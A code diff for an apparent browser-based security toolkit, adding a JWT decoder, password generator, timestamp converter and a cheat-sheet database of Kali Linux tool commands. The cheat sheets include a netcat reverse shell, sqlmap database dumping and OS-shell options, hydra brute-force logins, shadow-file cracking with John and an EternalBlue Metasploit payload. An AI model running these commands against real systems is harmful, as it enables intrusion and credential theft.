@@ -79,7 +79,21 @@ document.addEventListener('DOMContentLoaded', () => {
         'scanners/virustotal-ip': 'vt-ip',
         'network/pcap': 'pcap',
         'terminal/shell': 'terminal',
-        'settings/connection': 'connection'
+        'settings/connection': 'connection',
+        'crypto/jwt': 'jwt',
+        'crypto/password': 'password',
+        'utilities/timestamp': 'timestamp',
+        'kali/all': 'kali-all',
+        'kali/nmap': 'kali-nmap',
+        'kali/wireshark': 'kali-wireshark',
+        'kali/netcat': 'kali-netcat',
+        'kali/nikto': 'kali-nikto',
+        'kali/sqlmap': 'kali-sqlmap',
+        'kali/hydra': 'kali-hydra',
+        'kali/john': 'kali-john',
+        'kali/whois': 'kali-whois',
+        'kali/dig': 'kali-dig',
+        'kali/metasploit': 'kali-metasploit'
     };
 
     // Category names mapping
@@ -87,7 +101,10 @@ document.addEventListener('DOMContentLoaded', () => {
         'encoders': 'ENCODERS/DECODERS',
         'hash': 'HASH_TOOLS',
         'virustotal': 'VIRUSTOTAL',
-        'terminal': 'TERMINAL'
+        'terminal': 'TERMINAL',
+        'crypto': 'CRYPTO_TOOLS',
+        'utilities': 'UTILITIES',
+        'kali': 'KALI_TOOLS'
     };
 
     // Tool names mapping
@@ -105,7 +122,21 @@ document.addEventListener('DOMContentLoaded', () => {
         'vt-hash': 'HASH_LOOKUP',
         'vt-ip': 'IP/DOMAIN_LOOKUP',
         'terminal': 'WEB_TERMINAL',
-        'connection': 'REMOTE_CONNECTION'
+        'connection': 'REMOTE_CONNECTION',
+        'jwt': 'JWT_DECODER',
+        'password': 'PASSWORD_GEN',
+        'timestamp': 'TIMESTAMP',
+        'kali-all': 'ALL_TOOLS',
+        'kali-nmap': 'NMAP',
+        'kali-wireshark': 'WIRESHARK',
+        'kali-netcat': 'NETCAT',
+        'kali-nikto': 'NIKTO',
+        'kali-sqlmap': 'SQLMAP',
+        'kali-hydra': 'HYDRA',
+        'kali-john': 'JOHN',
+        'kali-whois': 'WHOIS',
+        'kali-dig': 'DIG',
+        'kali-metasploit': 'METASPLOIT'
     };
 
     // Category expand/collapse logic
@@ -1764,5 +1795,690 @@ document.addEventListener('DOMContentLoaded', () => {
         originalRenderSavedServers();
         updateTerminalServerOptions();
     };
+
+    // --- JWT Decoder Tool ---
+    const jwtInput = document.getElementById('jwt-input');
+    const jwtResult = document.getElementById('jwt-result');
+    const jwtHeader = document.getElementById('jwt-header');
+    const jwtPayload = document.getElementById('jwt-payload');
+    const jwtSignature = document.getElementById('jwt-signature');
+    const jwtValidity = document.getElementById('jwt-validity');
+    const jwtSecret = document.getElementById('jwt-secret');
+    const jwtVerifyResult = document.getElementById('jwt-verify-result');
+
+    function base64UrlDecode(str) {
+        // Replace URL-safe characters and add padding
+        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+        while (base64.length % 4) {
+            base64 += '=';
+        }
+        try {
+            return decodeURIComponent(atob(base64).split('').map(c => 
+                '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
+            ).join(''));
+        } catch (e) {
+            return atob(base64);
+        }
+    }
+
+    function decodeJWT(token) {
+        const parts = token.trim().split('.');
+        if (parts.length !== 3) {
+            throw new Error('Invalid JWT format - must have 3 parts');
+        }
+
+        const header = JSON.parse(base64UrlDecode(parts[0]));
+        const payload = JSON.parse(base64UrlDecode(parts[1]));
+        const signature = parts[2];
+
+        return { header, payload, signature };
+    }
+
+    function formatExpiry(payload) {
+        const now = Math.floor(Date.now() / 1000);
+        let html = '';
+
+        if (payload.exp) {
+            const expDate = new Date(payload.exp * 1000);
+            const isExpired = payload.exp < now;
+            html += `<div class="${isExpired ? 'expired' : 'valid'}">
+                EXPIRES: ${expDate.toLocaleString()} ${isExpired ? '(EXPIRED)' : '(VALID)'}
+            </div>`;
+        }
+
+        if (payload.iat) {
+            const iatDate = new Date(payload.iat * 1000);
+            html += `<div>ISSUED AT: ${iatDate.toLocaleString()}</div>`;
+        }
+
+        if (payload.nbf) {
+            const nbfDate = new Date(payload.nbf * 1000);
+            const notYetValid = payload.nbf > now;
+            html += `<div class="${notYetValid ? 'expired' : ''}">
+                NOT BEFORE: ${nbfDate.toLocaleString()} ${notYetValid ? '(NOT YET VALID)' : ''}
+            </div>`;
+        }
+
+        return html || '<div>NO EXPIRATION CLAIMS FOUND</div>';
+    }
+
+    if (document.getElementById('btn-jwt-decode')) {
+        document.getElementById('btn-jwt-decode').addEventListener('click', () => {
+            try {
+                if (!jwtInput.value.trim()) {
+                    alert('Please enter a JWT token');
+                    return;
+                }
+
+                const { header, payload, signature } = decodeJWT(jwtInput.value);
+
+                jwtHeader.textContent = JSON.stringify(header, null, 2);
+                jwtPayload.textContent = JSON.stringify(payload, null, 2);
+                jwtSignature.textContent = signature;
+                jwtValidity.innerHTML = formatExpiry(payload);
+
+                jwtResult.style.display = 'block';
+                jwtVerifyResult.innerHTML = '';
+            } catch (e) {
+                alert('ERROR: ' + e.message);
+                jwtResult.style.display = 'none';
+            }
+        });
+
+        document.getElementById('btn-jwt-clear').addEventListener('click', () => {
+            jwtInput.value = '';
+            jwtResult.style.display = 'none';
+            jwtVerifyResult.innerHTML = '';
+            jwtSecret.value = '';
+        });
+
+        // Copy buttons for JWT sections
+        document.querySelectorAll('[data-copy]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const targetId = btn.dataset.copy;
+                const targetEl = document.getElementById(targetId);
+                if (targetEl) {
+                    navigator.clipboard.writeText(targetEl.textContent);
+                    const originalText = btn.textContent;
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = originalText, 1000);
+                }
+            });
+        });
+
+        // HS256 Signature verification
+        document.getElementById('btn-jwt-verify').addEventListener('click', async () => {
+            try {
+                const token = jwtInput.value.trim();
+                const secret = jwtSecret.value;
+
+                if (!token || !secret) {
+                    jwtVerifyResult.innerHTML = '<p style="color: #ff6600;">PLEASE ENTER BOTH TOKEN AND SECRET</p>';
+                    return;
+                }
+
+                const parts = token.split('.');
+                if (parts.length !== 3) {
+                    jwtVerifyResult.innerHTML = '<p style="color: #ff0000;">INVALID JWT FORMAT</p>';
+                    return;
+                }
+
+                const { header } = decodeJWT(token);
+                if (header.alg !== 'HS256') {
+                    jwtVerifyResult.innerHTML = `<p style="color: #ff6600;">ALGORITHM IS ${header.alg}, ONLY HS256 VERIFICATION SUPPORTED</p>`;
+                    return;
+                }
+
+                // Create HMAC-SHA256 signature using Web Crypto API
+                const encoder = new TextEncoder();
+                const data = encoder.encode(parts[0] + '.' + parts[1]);
+                const keyData = encoder.encode(secret);
+
+                const key = await crypto.subtle.importKey(
+                    'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+                );
+
+                const signatureBytes = await crypto.subtle.sign('HMAC', key, data);
+                const computedSig = btoa(String.fromCharCode(...new Uint8Array(signatureBytes)))
+                    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+
+                if (computedSig === parts[2]) {
+                    jwtVerifyResult.innerHTML = '<p style="color: #00ff00;">✓ SIGNATURE VALID</p>';
+                } else {
+                    jwtVerifyResult.innerHTML = '<p style="color: #ff0000;">✗ SIGNATURE INVALID</p>';
+                }
+            } catch (e) {
+                jwtVerifyResult.innerHTML = `<p style="color: #ff0000;">ERROR: ${e.message}</p>`;
+            }
+        });
+    }
+
+    // --- Password Generator Tool ---
+    const passwordLength = document.getElementById('password-length');
+    const passwordLengthDisplay = document.getElementById('password-length-display');
+    const passwordOutput = document.getElementById('password-output');
+    const passwordStrength = document.getElementById('password-strength');
+
+    if (passwordLength) {
+        passwordLength.addEventListener('input', () => {
+            passwordLengthDisplay.textContent = passwordLength.value;
+        });
+
+        function generateSecurePassword(length, options) {
+            let charset = '';
+            if (options.uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            if (options.lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
+            if (options.numbers) charset += '0123456789';
+            if (options.symbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
+
+            if (charset.length === 0) {
+                return 'ERROR: SELECT AT LEAST ONE CHARACTER SET';
+            }
+
+            const array = new Uint32Array(length);
+            crypto.getRandomValues(array);
+            return Array.from(array, x => charset[x % charset.length]).join('');
+        }
+
+        function calculateStrength(password) {
+            let score = 0;
+            if (password.length >= 8) score++;
+            if (password.length >= 12) score++;
+            if (password.length >= 16) score++;
+            if (/[a-z]/.test(password)) score++;
+            if (/[A-Z]/.test(password)) score++;
+            if (/[0-9]/.test(password)) score++;
+            if (/[^a-zA-Z0-9]/.test(password)) score++;
+
+            if (score <= 2) return { level: 'WEAK', color: '#ff0000' };
+            if (score <= 4) return { level: 'MODERATE', color: '#ff6600' };
+            if (score <= 5) return { level: 'STRONG', color: '#00ff00' };
+            return { level: 'VERY STRONG', color: '#00ffff' };
+        }
+
+        document.getElementById('btn-generate-password').addEventListener('click', () => {
+            const length = parseInt(passwordLength.value);
+            const count = parseInt(document.getElementById('password-count').value);
+            const options = {
+                uppercase: document.getElementById('pw-uppercase').checked,
+                lowercase: document.getElementById('pw-lowercase').checked,
+                numbers: document.getElementById('pw-numbers').checked,
+                symbols: document.getElementById('pw-symbols').checked
+            };
+
+            const passwords = [];
+            for (let i = 0; i < count; i++) {
+                passwords.push(generateSecurePassword(length, options));
+            }
+            passwordOutput.value = passwords.join('\n');
+
+            // Show strength for first password
+            if (passwords.length > 0 && !passwords[0].startsWith('ERROR')) {
+                const strength = calculateStrength(passwords[0]);
+                passwordStrength.innerHTML = `STRENGTH: <span style="color: ${strength.color};">${strength.level}</span>`;
+            }
+        });
+
+        document.getElementById('btn-generate-uuid').addEventListener('click', () => {
+            const count = parseInt(document.getElementById('password-count').value);
+            const uuids = [];
+            for (let i = 0; i < count; i++) {
+                uuids.push(crypto.randomUUID());
+            }
+            passwordOutput.value = uuids.join('\n');
+            passwordStrength.innerHTML = '';
+        });
+
+        document.getElementById('btn-generate-apikey').addEventListener('click', () => {
+            const count = parseInt(document.getElementById('password-count').value);
+            const keys = [];
+            const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            for (let i = 0; i < count; i++) {
+                const array = new Uint32Array(32);
+                crypto.getRandomValues(array);
+                const key = Array.from(array, x => charset[x % charset.length]).join('');
+                keys.push(key);
+            }
+            passwordOutput.value = keys.join('\n');
+            passwordStrength.innerHTML = '';
+        });
+
+        document.getElementById('btn-copy-password').addEventListener('click', () => {
+            if (passwordOutput.value) {
+                navigator.clipboard.writeText(passwordOutput.value);
+                const btn = document.getElementById('btn-copy-password');
+                const originalText = btn.textContent;
+                btn.textContent = 'COPIED!';
+                setTimeout(() => btn.textContent = originalText, 1000);
+            }
+        });
+
+        document.getElementById('btn-password-clear').addEventListener('click', () => {
+            passwordOutput.value = '';
+            passwordStrength.innerHTML = '';
+        });
+    }
+
+    // --- Timestamp Converter Tool ---
+    const currentTimestamp = document.getElementById('current-timestamp');
+
+    if (currentTimestamp) {
+        // Update current timestamp every second
+        function updateCurrentTimestamp() {
+            currentTimestamp.textContent = Math.floor(Date.now() / 1000);
+        }
+        setInterval(updateCurrentTimestamp, 1000);
+        updateCurrentTimestamp();
+
+        document.getElementById('btn-copy-timestamp').addEventListener('click', () => {
+            navigator.clipboard.writeText(currentTimestamp.textContent);
+            const btn = document.getElementById('btn-copy-timestamp');
+            const originalText = btn.textContent;
+            btn.textContent = 'COPIED!';
+            setTimeout(() => btn.textContent = originalText, 1000);
+        });
+
+        document.getElementById('btn-unix-to-human').addEventListener('click', () => {
+            const input = document.getElementById('unix-input').value.trim();
+            const isMs = document.getElementById('unix-milliseconds').checked;
+
+            if (!input) {
+                alert('Please enter a Unix timestamp');
+                return;
+            }
+
+            let timestamp = parseInt(input);
+            if (isNaN(timestamp)) {
+                document.getElementById('unix-result').value = 'ERROR: INVALID TIMESTAMP';
+                return;
+            }
+
+            // Convert to milliseconds if needed
+            if (!isMs) {
+                timestamp *= 1000;
+            }
+
+            const date = new Date(timestamp);
+            const result = [
+                `LOCAL: ${date.toLocaleString()}`,
+                `UTC: ${date.toUTCString()}`,
+                `ISO 8601: ${date.toISOString()}`,
+                `DATE: ${date.toDateString()}`,
+                `TIME: ${date.toTimeString()}`
+            ].join('\n');
+
+            document.getElementById('unix-result').value = result;
+        });
+
+        document.getElementById('btn-human-to-unix').addEventListener('click', () => {
+            const input = document.getElementById('human-input').value;
+
+            if (!input) {
+                alert('Please select a date and time');
+                return;
+            }
+
+            const date = new Date(input);
+            const seconds = Math.floor(date.getTime() / 1000);
+            const ms = date.getTime();
+
+            const result = [
+                `SECONDS: ${seconds}`,
+                `MILLISECONDS: ${ms}`,
+                `ISO 8601: ${date.toISOString()}`
+            ].join('\n');
+
+            document.getElementById('human-result').value = result;
+        });
+
+        document.getElementById('btn-set-now').addEventListener('click', () => {
+            const now = new Date();
+            // Format for datetime-local input
+            const offset = now.getTimezoneOffset();
+            const local = new Date(now.getTime() - offset * 60000);
+            document.getElementById('human-input').value = local.toISOString().slice(0, 16);
+        });
+
+        document.getElementById('btn-timestamp-clear').addEventListener('click', () => {
+            document.getElementById('unix-input').value = '';
+            document.getElementById('unix-result').value = '';
+            document.getElementById('human-input').value = '';
+            document.getElementById('human-result').value = '';
+        });
+    }
+
+    // --- Kali Linux Tools Database ---
+    const kaliTools = {
+        nmap: {
+            name: 'Nmap',
+            fullName: 'Network Mapper',
+            category: 'Network Analysis',
+            description: 'Nmap is a free and open-source network scanner used to discover hosts and services on a computer network by sending packets and analyzing the responses.',
+            installation: 'apt install nmap',
+            commands: [
+                { cmd: 'nmap <target>', desc: 'Basic scan - discovers open ports', example: 'nmap 192.168.1.1' },
+                { cmd: 'nmap -sS <target>', desc: 'TCP SYN scan (stealth scan)', example: 'nmap -sS 192.168.1.1' },
+                { cmd: 'nmap -sV <target>', desc: 'Service version detection', example: 'nmap -sV 192.168.1.1' },
+                { cmd: 'nmap -O <target>', desc: 'OS detection', example: 'nmap -O 192.168.1.1' },
+                { cmd: 'nmap -A <target>', desc: 'Aggressive scan (OS, version, scripts, traceroute)', example: 'nmap -A 192.168.1.1' },
+                { cmd: 'nmap -p <ports> <target>', desc: 'Scan specific ports', example: 'nmap -p 22,80,443 192.168.1.1' },
+                { cmd: 'nmap -p- <target>', desc: 'Scan all 65535 ports', example: 'nmap -p- 192.168.1.1' },
+                { cmd: 'nmap -sU <target>', desc: 'UDP scan', example: 'nmap -sU 192.168.1.1' },
+                { cmd: 'nmap -sn <network>', desc: 'Ping sweep (host discovery)', example: 'nmap -sn 192.168.1.0/24' },
+                { cmd: 'nmap --script <script> <target>', desc: 'Run NSE scripts', example: 'nmap --script vuln 192.168.1.1' },
+                { cmd: 'nmap -oN <file> <target>', desc: 'Output to normal file', example: 'nmap -oN scan.txt 192.168.1.1' },
+                { cmd: 'nmap -oX <file> <target>', desc: 'Output to XML file', example: 'nmap -oX scan.xml 192.168.1.1' },
+                { cmd: 'nmap -T<0-5> <target>', desc: 'Timing template (0=paranoid, 5=insane)', example: 'nmap -T4 192.168.1.1' },
+                { cmd: 'nmap -Pn <target>', desc: 'Skip host discovery (treat as online)', example: 'nmap -Pn 192.168.1.1' }
+            ]
+        },
+        wireshark: {
+            name: 'Wireshark / tshark',
+            fullName: 'Network Protocol Analyzer',
+            category: 'Network Analysis',
+            description: 'Wireshark is a network protocol analyzer that captures and analyzes network traffic. tshark is its command-line equivalent.',
+            installation: 'apt install wireshark tshark',
+            commands: [
+                { cmd: 'tshark -i <interface>', desc: 'Capture on interface', example: 'tshark -i eth0' },
+                { cmd: 'tshark -i <interface> -w <file>', desc: 'Capture and save to file', example: 'tshark -i eth0 -w capture.pcap' },
+                { cmd: 'tshark -r <file>', desc: 'Read from pcap file', example: 'tshark -r capture.pcap' },
+                { cmd: 'tshark -i <interface> -f "<filter>"', desc: 'Capture with BPF filter', example: 'tshark -i eth0 -f "port 80"' },
+                { cmd: 'tshark -r <file> -Y "<filter>"', desc: 'Display filter on file', example: 'tshark -r capture.pcap -Y "http"' },
+                { cmd: 'tshark -D', desc: 'List available interfaces', example: 'tshark -D' },
+                { cmd: 'tshark -i <interface> -c <count>', desc: 'Capture specific number of packets', example: 'tshark -i eth0 -c 100' },
+                { cmd: 'tshark -r <file> -T fields -e <field>', desc: 'Extract specific fields', example: 'tshark -r cap.pcap -T fields -e ip.src -e ip.dst' },
+                { cmd: 'tshark -i <interface> -Y "tcp.port==443"', desc: 'Filter HTTPS traffic', example: 'tshark -i eth0 -Y "tcp.port==443"' },
+                { cmd: 'tshark -r <file> -z io,stat,1', desc: 'Show I/O statistics', example: 'tshark -r capture.pcap -z io,stat,1' }
+            ]
+        },
+        netcat: {
+            name: 'Netcat',
+            fullName: 'TCP/UDP Swiss Army Knife',
+            category: 'Network Analysis',
+            description: 'Netcat (nc) is a versatile networking utility for reading/writing data across network connections using TCP or UDP.',
+            installation: 'apt install netcat-openbsd',
+            commands: [
+                { cmd: 'nc <host> <port>', desc: 'Connect to a host and port', example: 'nc 192.168.1.1 80' },
+                { cmd: 'nc -l -p <port>', desc: 'Listen on a port', example: 'nc -l -p 4444' },
+                { cmd: 'nc -lvp <port>', desc: 'Listen verbosely', example: 'nc -lvp 4444' },
+                { cmd: 'nc -z <host> <port-range>', desc: 'Port scanning', example: 'nc -z 192.168.1.1 20-100' },
+                { cmd: 'nc -e /bin/bash <host> <port>', desc: 'Reverse shell', example: 'nc -e /bin/bash 192.168.1.100 4444' },
+                { cmd: 'nc -l -p <port> > file', desc: 'Receive file', example: 'nc -l -p 1234 > received.txt' },
+                { cmd: 'nc <host> <port> < file', desc: 'Send file', example: 'nc 192.168.1.1 1234 < send.txt' },
+                { cmd: 'nc -u <host> <port>', desc: 'UDP mode', example: 'nc -u 192.168.1.1 53' },
+                { cmd: 'nc -v <host> <port>', desc: 'Verbose output', example: 'nc -v 192.168.1.1 22' },
+                { cmd: 'nc -w <seconds> <host> <port>', desc: 'Set timeout', example: 'nc -w 5 192.168.1.1 80' }
+            ]
+        },
+        nikto: {
+            name: 'Nikto',
+            fullName: 'Web Server Scanner',
+            category: 'Vulnerability Analysis',
+            description: 'Nikto is an open-source web server scanner that tests for dangerous files, outdated server software, and other security issues.',
+            installation: 'apt install nikto',
+            commands: [
+                { cmd: 'nikto -h <host>', desc: 'Basic scan', example: 'nikto -h http://192.168.1.1' },
+                { cmd: 'nikto -h <host> -p <port>', desc: 'Scan specific port', example: 'nikto -h 192.168.1.1 -p 8080' },
+                { cmd: 'nikto -h <host> -ssl', desc: 'Force SSL mode', example: 'nikto -h 192.168.1.1 -ssl' },
+                { cmd: 'nikto -h <host> -o <file>', desc: 'Output to file', example: 'nikto -h 192.168.1.1 -o report.txt' },
+                { cmd: 'nikto -h <host> -Format htm', desc: 'HTML output format', example: 'nikto -h 192.168.1.1 -o report.html -Format htm' },
+                { cmd: 'nikto -h <host> -Tuning <x>', desc: 'Scan tuning (1-9,a-c)', example: 'nikto -h 192.168.1.1 -Tuning 9' },
+                { cmd: 'nikto -h <host> -evasion <1-8>', desc: 'IDS evasion techniques', example: 'nikto -h 192.168.1.1 -evasion 1' },
+                { cmd: 'nikto -h <host> -C all', desc: 'Scan all CGI directories', example: 'nikto -h 192.168.1.1 -C all' },
+                { cmd: 'nikto -update', desc: 'Update plugins and databases', example: 'nikto -update' },
+                { cmd: 'nikto -list-plugins', desc: 'List available plugins', example: 'nikto -list-plugins' }
+            ]
+        },
+        sqlmap: {
+            name: 'SQLMap',
+            fullName: 'SQL Injection Tool',
+            category: 'Vulnerability Analysis',
+            description: 'SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws.',
+            installation: 'apt install sqlmap',
+            commands: [
+                { cmd: 'sqlmap -u "<url>"', desc: 'Test URL for SQL injection', example: 'sqlmap -u "http://site.com/page?id=1"' },
+                { cmd: 'sqlmap -u "<url>" --dbs', desc: 'Enumerate databases', example: 'sqlmap -u "http://site.com/page?id=1" --dbs' },
+                { cmd: 'sqlmap -u "<url>" -D <db> --tables', desc: 'Enumerate tables', example: 'sqlmap -u "http://site.com/page?id=1" -D testdb --tables' },
+                { cmd: 'sqlmap -u "<url>" -D <db> -T <table> --columns', desc: 'Enumerate columns', example: 'sqlmap -u "..." -D testdb -T users --columns' },
+                { cmd: 'sqlmap -u "<url>" -D <db> -T <table> --dump', desc: 'Dump table data', example: 'sqlmap -u "..." -D testdb -T users --dump' },
+                { cmd: 'sqlmap -u "<url>" --forms', desc: 'Automatically test forms', example: 'sqlmap -u "http://site.com/login" --forms' },
+                { cmd: 'sqlmap -u "<url>" --batch', desc: 'Non-interactive mode', example: 'sqlmap -u "..." --batch' },
+                { cmd: 'sqlmap -u "<url>" --level=5 --risk=3', desc: 'Maximum testing', example: 'sqlmap -u "..." --level=5 --risk=3' },
+                { cmd: 'sqlmap -u "<url>" --os-shell', desc: 'Get OS shell', example: 'sqlmap -u "..." --os-shell' },
+                { cmd: 'sqlmap -r <request.txt>', desc: 'Load request from file', example: 'sqlmap -r request.txt' }
+            ]
+        },
+        hydra: {
+            name: 'Hydra',
+            fullName: 'Login Cracker',
+            category: 'Password Attacks',
+            description: 'Hydra is a fast and flexible online password cracking tool supporting numerous protocols including SSH, FTP, HTTP, and more.',
+            installation: 'apt install hydra',
+            commands: [
+                { cmd: 'hydra -l <user> -P <wordlist> <host> ssh', desc: 'SSH brute force', example: 'hydra -l admin -P wordlist.txt 192.168.1.1 ssh' },
+                { cmd: 'hydra -L <users> -P <wordlist> <host> ssh', desc: 'Multiple users SSH', example: 'hydra -L users.txt -P pass.txt 192.168.1.1 ssh' },
+                { cmd: 'hydra -l <user> -P <wordlist> ftp://<host>', desc: 'FTP brute force', example: 'hydra -l admin -P wordlist.txt ftp://192.168.1.1' },
+                { cmd: 'hydra -l <user> -P <wordlist> <host> http-post-form "<path>:<data>:<fail>"', desc: 'HTTP POST form', example: 'hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
+                { cmd: 'hydra -l <user> -P <wordlist> <host> http-get /<path>', desc: 'HTTP Basic Auth', example: 'hydra -l admin -P pass.txt 192.168.1.1 http-get /admin' },
+                { cmd: 'hydra -l <user> -P <wordlist> <host> mysql', desc: 'MySQL brute force', example: 'hydra -l root -P pass.txt 192.168.1.1 mysql' },
+                { cmd: 'hydra -l <user> -P <wordlist> rdp://<host>', desc: 'RDP brute force', example: 'hydra -l administrator -P pass.txt rdp://192.168.1.1' },
+                { cmd: 'hydra -t <threads> ...', desc: 'Set parallel tasks', example: 'hydra -t 16 -l admin -P pass.txt 192.168.1.1 ssh' },
+                { cmd: 'hydra -V ...', desc: 'Verbose output', example: 'hydra -V -l admin -P pass.txt 192.168.1.1 ssh' },
+                { cmd: 'hydra -o <file> ...', desc: 'Output results to file', example: 'hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh' }
+            ]
+        },
+        john: {
+            name: 'John the Ripper',
+            fullName: 'Password Cracker',
+            category: 'Password Attacks',
+            description: 'John the Ripper is a fast password cracker for detecting weak Unix passwords and cracking various hash types.',
+            installation: 'apt install john',
+            commands: [
+                { cmd: 'john <hashfile>', desc: 'Crack password hashes', example: 'john hashes.txt' },
+                { cmd: 'john --wordlist=<file> <hashfile>', desc: 'Dictionary attack', example: 'john --wordlist=rockyou.txt hashes.txt' },
+                { cmd: 'john --format=<type> <hashfile>', desc: 'Specify hash format', example: 'john --format=raw-md5 hashes.txt' },
+                { cmd: 'john --show <hashfile>', desc: 'Show cracked passwords', example: 'john --show hashes.txt' },
+                { cmd: 'john --list=formats', desc: 'List supported formats', example: 'john --list=formats' },
+                { cmd: 'unshadow /etc/passwd /etc/shadow > file', desc: 'Combine passwd and shadow', example: 'unshadow /etc/passwd /etc/shadow > unshadowed.txt' },
+                { cmd: 'john --incremental <hashfile>', desc: 'Incremental/brute force mode', example: 'john --incremental hashes.txt' },
+                { cmd: 'john --rules --wordlist=<file> <hashfile>', desc: 'Apply word mangling rules', example: 'john --rules --wordlist=pass.txt hashes.txt' },
+                { cmd: 'john --restore', desc: 'Resume interrupted session', example: 'john --restore' },
+                { cmd: 'zip2john <file.zip> > hash.txt', desc: 'Extract ZIP hash', example: 'zip2john secret.zip > hash.txt' }
+            ]
+        },
+        whois: {
+            name: 'Whois',
+            fullName: 'Domain Information Lookup',
+            category: 'Information Gathering',
+            description: 'Whois is a query/response protocol used to query databases that store registered users or assignees of domain names and IP addresses.',
+            installation: 'apt install whois',
+            commands: [
+                { cmd: 'whois <domain>', desc: 'Domain lookup', example: 'whois example.com' },
+                { cmd: 'whois <ip>', desc: 'IP address lookup', example: 'whois 8.8.8.8' },
+                { cmd: 'whois -h <server> <domain>', desc: 'Query specific whois server', example: 'whois -h whois.verisign-grs.com example.com' },
+                { cmd: 'whois <domain> | grep -i "name server"', desc: 'Get name servers only', example: 'whois example.com | grep -i "name server"' },
+                { cmd: 'whois <domain> | grep -i "registrar"', desc: 'Get registrar info', example: 'whois example.com | grep -i "registrar"' },
+                { cmd: 'whois <domain> | grep -i "creation"', desc: 'Get creation date', example: 'whois example.com | grep -i "creation"' },
+                { cmd: 'whois <domain> | grep -i "expir"', desc: 'Get expiration date', example: 'whois example.com | grep -i "expir"' },
+                { cmd: 'whois -a <domain>', desc: 'Show all matches (verbose)', example: 'whois -a example.com' }
+            ]
+        },
+        dig: {
+            name: 'Dig',
+            fullName: 'DNS Lookup Utility',
+            category: 'Information Gathering',
+            description: 'Dig (Domain Information Groper) is a flexible tool for interrogating DNS name servers and performing DNS lookups.',
+            installation: 'apt install dnsutils',
+            commands: [
+                { cmd: 'dig <domain>', desc: 'Basic DNS lookup (A record)', example: 'dig example.com' },
+                { cmd: 'dig <domain> ANY', desc: 'Query all record types', example: 'dig example.com ANY' },
+                { cmd: 'dig <domain> MX', desc: 'Query MX records', example: 'dig example.com MX' },
+                { cmd: 'dig <domain> NS', desc: 'Query name servers', example: 'dig example.com NS' },
+                { cmd: 'dig <domain> TXT', desc: 'Query TXT records', example: 'dig example.com TXT' },
+                { cmd: 'dig <domain> AAAA', desc: 'Query IPv6 address', example: 'dig example.com AAAA' },
+                { cmd: 'dig @<server> <domain>', desc: 'Query specific DNS server', example: 'dig @8.8.8.8 example.com' },
+                { cmd: 'dig +short <domain>', desc: 'Short output (IP only)', example: 'dig +short example.com' },
+                { cmd: 'dig +trace <domain>', desc: 'Trace DNS delegation path', example: 'dig +trace example.com' },
+                { cmd: 'dig -x <ip>', desc: 'Reverse DNS lookup', example: 'dig -x 8.8.8.8' },
+                { cmd: 'dig <domain> +noall +answer', desc: 'Show only answer section', example: 'dig example.com +noall +answer' },
+                { cmd: 'dig axfr @<ns> <domain>', desc: 'Zone transfer (if allowed)', example: 'dig axfr @ns1.example.com example.com' }
+            ]
+        },
+        metasploit: {
+            name: 'Metasploit',
+            fullName: 'Penetration Testing Framework',
+            category: 'Exploitation',
+            description: 'Metasploit Framework is a powerful penetration testing platform that enables finding security issues, verifying vulnerabilities, and managing security assessments.',
+            installation: 'apt install metasploit-framework',
+            commands: [
+                { cmd: 'msfconsole', desc: 'Start Metasploit console', example: 'msfconsole' },
+                { cmd: 'search <keyword>', desc: 'Search for exploits/modules', example: 'search type:exploit platform:windows smb' },
+                { cmd: 'use <module>', desc: 'Select a module', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
+                { cmd: 'info', desc: 'Show module information', example: 'info' },
+                { cmd: 'show options', desc: 'Display module options', example: 'show options' },
+                { cmd: 'set <option> <value>', desc: 'Set module option', example: 'set RHOSTS 192.168.1.1' },
+                { cmd: 'set PAYLOAD <payload>', desc: 'Set payload', example: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' },
+                { cmd: 'exploit / run', desc: 'Execute the module', example: 'exploit' },
+                { cmd: 'sessions -l', desc: 'List active sessions', example: 'sessions -l' },
+                { cmd: 'sessions -i <id>', desc: 'Interact with session', example: 'sessions -i 1' },
+                { cmd: 'background', desc: 'Background current session', example: 'background' },
+                { cmd: 'db_nmap <args>', desc: 'Run nmap and import results', example: 'db_nmap -sV 192.168.1.0/24' }
+            ],
+            note: '⚠️ Metasploit requires proper setup. Use msfdb init to initialize the database.'
+        }
+    };
+
+    // Render Kali tools grid on the all-tools page
+    function renderKaliToolsGrid() {
+        const grid = document.getElementById('kali-tools-grid');
+        if (!grid) return;
+
+        const categories = {};
+        Object.entries(kaliTools).forEach(([id, tool]) => {
+            if (!categories[tool.category]) categories[tool.category] = [];
+            categories[tool.category].push({ id, ...tool });
+        });
+
+        let html = '';
+        Object.entries(categories).forEach(([category, tools]) => {
+            html += `<div class="kali-category">
+                <h3>${category}</h3>
+                <div class="kali-tools-list">
+                    ${tools.map(tool => `
+                        <div class="kali-tool-card" data-route="kali/${tool.id}">
+                            <div class="kali-tool-name">${tool.name}</div>
+                            <div class="kali-tool-desc">${tool.description.substring(0, 80)}...</div>
+                            <div class="kali-tool-count">${tool.commands.length} commands</div>
+                        </div>
+                    `).join('')}
+                </div>
+            </div>`;
+        });
+
+        grid.innerHTML = html;
+
+        // Add click handlers
+        grid.querySelectorAll('.kali-tool-card').forEach(card => {
+            card.addEventListener('click', () => {
+                navigateTo(card.dataset.route);
+            });
+        });
+    }
+
+    // Render individual Kali tool detail page
+    function renderKaliToolDetail(toolId) {
+        const tool = kaliTools[toolId];
+        const panel = document.getElementById(`kali-${toolId}-tool`);
+        if (!tool || !panel) return;
+
+        panel.innerHTML = `
+            <h2>// ${tool.name.toUpperCase()}</h2>
+            <div class="tool-interface">
+                <div class="kali-tool-header">
+                    <div class="kali-tool-info">
+                        <span class="kali-badge">${tool.category}</span>
+                        <h3>${tool.fullName}</h3>
